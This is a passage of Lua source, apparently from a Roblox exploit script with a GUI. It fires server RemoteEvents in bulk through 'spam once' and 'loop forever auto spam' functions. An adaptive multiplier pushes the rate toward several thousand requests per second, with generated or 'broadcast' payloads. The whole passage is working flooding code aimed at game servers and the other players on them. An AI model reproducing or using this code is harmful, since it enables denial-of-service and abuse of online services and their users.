-- ==============================================
-- SPAM ONCE
-- ==============================================
local function spamOnce()
    local activeRemotes = getActiveRemotes()
    if #activeRemotes == 0 then
        showNotification("❌ ERROR", "No active remotes! Scan & enable some.", true)
        return
    end
    
    if autoSpamEnabled then
        showNotification("⚠️ WARNING", "Stop auto spam first!", true)
        return
    end
    
    showNotification("💥 SPAM ONCE", "Spamming " .. config.spamCount .. "x on " .. #activeRemotes .. " remotes")
    
    if statusLabel then
        TweenService:Create(statusLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {TextColor3 = Colors.RedBright}):Play()
        statusLabel.Text = "⚡ SPAMMING ONCE"
    end
    
    local spammed = 0
    while spammed < config.spamCount do
        for _, remote in ipairs(activeRemotes) do
            pcall(function()
                if broadcastEnabled then
                    remote:FireServer(generateBroadcastPayload())
                else
                    remote:FireServer(generatePayload())
                end
            end)
        end
        spammed = spammed + 1
        task.wait(config.spamDelay)
    end
    
    if statusLabel then
        TweenService:Create(statusLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {TextColor3 = Colors.GrayDark}):Play()
        statusLabel.Text = "● STANDBY"
    end
    
    showNotification("✅ SPAM COMPLETE", "One shot spam finished")
end

-- ==============================================
-- LOOP FOREVER AUTO SPAM
-- ==============================================
local function startAutoSpam()
    if autoSpamEnabled then return end
    
    local activeRemotes = getActiveRemotes()
    if #activeRemotes == 0 then
        showNotification("❌ ERROR", "No active remotes! Scan & enable some.", true)
        return
    end
    
    autoSpamEnabled = true
    firedCount = 0
    performance.lastTick = tick()
    performance.currentRPS = 0
    performance.multiplier = config.speedMultiplier
    
    local mode = broadcastEnabled and "📢 BROADCAST" or "💥 BRUTAL SPAM"
    showNotification("🔄 AUTO SPAM ON", mode .. " | " .. #activeRemotes .. " remotes active")
    
    if statusLabel then
        TweenService:Create(statusLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {TextColor3 = Colors.RedBright}):Play()
        statusLabel.Text = "🔁 AUTO SPAM ACTIVE"
    end
    
    if autoSpamButton then
        TweenService:Create(autoSpamButton, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundColor3 = Colors.RedBright}):Play()
        autoSpamButton.Text = "⏹️ AUTO SPAM ON"
    end
    
    autoSpamThread = coroutine.create(function()
        while autoSpamEnabled do
            local activeNow = getActiveRemotes()
            if #activeNow == 0 then
                showNotification("⚠️ WARNING", "No active remotes! Auto spam stopped.", true)
                stopAutoSpam()
                break
            end
            
            local now = tick()
            local delta = now - performance.lastTick
            if delta > 0.05 then
                performance.currentRPS = firedCount / delta
                performance.lastTick = now
                if performance.currentRPS > performance.peakRPS then
                    performance.peakRPS = performance.currentRPS
                end
                if performance.currentRPS > 7000 then
                    performance.multiplier = math.min(performance.multiplier + 3, config.maxMultiplier)
                elseif performance.currentRPS < 4000 then
                    performance.multiplier = math.max(performance.multiplier - 2, config.minMultiplier)
                end
            end
            
            for i = 1, performance.multiplier do
                if not autoSpamEnabled then break end
                for _, remote in ipairs(activeNow) do
                    if not autoSpamEnabled then break end
                    task.spawn(function()
                        pcall(function()
                            if broadcastEnabled then
                                remote:FireServer(generateBroadcastPayload())
                            else
                                remote:FireServer(generatePayload())
                            end
                        end)
                    end)
                    firedCount = firedCount + 1
                end
            end
            task.wait(config.spamDelay)
        end
    end)
    
    coroutine.resume(autoSpamThread)
end

local function stopAutoSpam()
    autoSpamEnabled = false
    autoSpamThread = nil
    
    if statusLabel then
        TweenService:Create(statusLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {TextColor3 = Colors.GrayDark}):Play()
        statusLabel.Text = "● STANDBY"
    end
    
    if autoSpamButton then
        TweenService:Create(autoSpamButton, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundColor3 = Colors.RedDark}):Play()
        autoSpamButton.Text = "🔄 AUTO SPAM"
    end
    
    showNotification("⏹️ AUTO SPAM OFF", "Auto spam stopped | Peak RPS: " .. math.floor(performance.peakRPS))
    firedCount = 0
end

local function toggleAutoSpam()
    if autoSpamEnabled then
        stopAutoSpam()
    else
        startAutoSpam()
    end
end

local function stopAllSpam()
    if autoSpamEnabled then
        stopAutoSpam()
    end
    if statusLabel then
        TweenService:Create(statusLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {TextColor3 = Colors.GrayDark}):Play()
        statusLabel.Text = "● STANDBY"
    end
    showNotification("⏹️ SPAM STOPPED", "All spam stopped")
end

